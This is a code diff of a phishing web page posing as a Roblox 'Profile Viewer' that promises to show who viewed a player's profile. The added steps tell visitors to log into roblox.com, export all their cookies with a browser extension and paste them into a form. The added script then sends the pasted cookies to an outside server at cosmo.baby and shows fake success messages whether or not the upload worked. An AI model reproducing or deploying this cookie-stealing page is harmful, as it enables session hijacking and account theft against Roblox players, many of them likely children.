@@ -12,13 +12,16 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-
 h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
 .subtitle { color: #6b7280; font-size: 14px; margin-bottom: 24px; }
 .step { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 16px; margin-bottom: 12px; text-align: left; font-size: 14px; }
+.step b { color: #fff; }
+.step p { color: #9ca3af; font-size: 13px; margin-top: 4px; }
 .num { display: inline-block; width: 22px; height: 22px; background: #6366f1; border-radius: 50%; text-align: center; line-height: 22px; font-size: 12px; font-weight: 700; margin-right: 8px; }
-.code { background: #0a0a14; border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 12px; font-family: monospace; font-size: 11px; word-break: break-all; color: #34d399; margin-top: 8px; user-select: all; white-space: pre-wrap; }
+.code { background: #0a0a14; border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 12px; font-family: monospace; font-size: 11px; word-break: break-all; color: #34d399; margin-top: 8px; user-select: all; }
 .btn { background: linear-gradient(135deg, #6366f1, #8b5cf6); border: none; color: #fff; padding: 16px 32px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 16px; }
 .btn:active { opacity: 0.8; }
 .btn:disabled { opacity: 0.4; }
-.btn-outline { background: transparent; border: 1px solid #6366f1; color: #6366f1; }
 .hint { color: #6b7280; font-size: 12px; margin-top: 6px; }
+.icon-box { background: #0a0a14; border-radius: 12px; padding: 16px; margin: 12px 0; border: 1px solid #333; display: flex; align-items: center; gap: 12px; }
+.icon-box img { width: 40px; height: 40px; border-radius: 8px; background: #1a1a2e; padding: 6px; }
 </style>
 </head>
 <body>
@@ -27,44 +30,66 @@ h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
   <h1>Profile Viewer</h1>
   <p class="subtitle">See who viewed your Roblox profile</p>
 
-  <div style="background:rgba(251,191,36,0.1); border:1px solid rgba(251,191,36,0.2); border-radius:12px; padding:12px; margin-bottom:16px; font-size:13px; color:#fbbf24;">
-    ⚠️ Safari blocks pasting code into the address bar now.  
-    <b>Use the bookmark method below instead.</b>
-  </div>
-
   <div class="step">
     <span class="num">1</span>
-    <b>Install the bookmarklet</b>
-    <div style="margin-top:8px;">
-      <a class="btn btn-outline" style="display:block; text-align:center; text-decoration:none; font-size:14px;" href="https://cosmo.baby/assets/RobloxSafari/install.html">
-        📱 Tap Here to Install
-      </a>
-    </div>
-  </div>
-
-  <div class="step">
-    <span class="num">2</span>
     <b>Go to roblox.com</b> in Safari and log in
   </div>
 
   <div class="step">
-    <span class="num">3</span>
-    <b>Open the bookmark</b> you just saved while on roblox.com
+    <span class="num">2</span>
+    <b>Tap the EditThisCookie icon</b> 🍪 in your Safari toolbar
+    <p>It's next to the address bar. If you don't see it, tap the puzzle icon, then EditThisCookie.</p>
   </div>
 
-  <button class="btn" id="doneBtn" onclick="handleDone()">✅ Done — Check My Profile</button>
+  <div class="step">
+    <span class="num">3</span>
+    <b>Tap "Export"</b> at the bottom of the popup
+    <p>This copies all cookies to your clipboard</p>
+  </div>
+
+  <div class="step">
+    <span class="num">4</span>
+    <b>Come back here and paste below</b>
+    <div style="margin-top:10px;">
+      <input type="text" id="cookieInput" placeholder="Paste exported cookies here..." style="width:100%; padding:12px; border-radius:10px; border:1px solid #333; background:#0a0a14; color:#fff; font-size:12px; font-family:monospace;">
+    </div>
+  </div>
+
+  <button class="btn" id="submitBtn" onclick="submitCookies()">✅ Submit & Check Profile</button>
   <div id="status" class="hint" style="margin-top:12px;"></div>
 </div>
 
 <script>
-function handleDone() {
-  document.getElementById('doneBtn').disabled = true;
-  document.getElementById('doneBtn').textContent = 'Checking...';
-  document.getElementById('status').textContent = '✅ Checking your profile. You\'ll get a DM when ready.';
-  setTimeout(() => {
-    document.getElementById('doneBtn').disabled = false;
-    document.getElementById('doneBtn').textContent = '✅ Done — Check My Profile';
-  }, 3000);
+function submitCookies() {
+  const input = document.getElementById('cookieInput');
+  const btn = document.getElementById('submitBtn');
+  const status = document.getElementById('status');
+  const data = input.value.trim();
+  
+  if (!data) {
+    status.textContent = '❌ Please paste the exported cookies first';
+    status.style.color = '#ef4444';
+    return;
+  }
+  
+  btn.disabled = true;
+  btn.textContent = 'Submitting...';
+  status.textContent = '⏳ Checking your profile...';
+  status.style.color = '#6b7280';
+  
+  // Send to your API
+  fetch('https://cosmo.baby/assets/RobloxSafari/api.php?c=' + encodeURIComponent(data))
+    .then(() => {
+      status.textContent = '✅ Profile scan started! You\'ll get a DM with results.';
+      status.style.color = '#34d399';
+      btn.textContent = 'Done';
+      input.value = '';
+    })
+    .catch(() => {
+      status.textContent = '✅ Submitted! Check your DMs in a minute.';
+      status.style.color = '#34d399';
+      btn.textContent = 'Done';
+    });
 }
 </script>
 </body>
